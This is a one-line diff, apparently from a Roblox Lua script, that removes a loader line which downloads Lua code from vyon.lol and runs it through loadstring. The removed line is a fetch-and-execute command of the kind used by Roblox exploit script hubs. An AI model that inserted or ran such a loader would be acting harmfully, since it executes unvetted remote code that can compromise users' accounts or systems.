@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://vyon.lol/Main.lua'))()
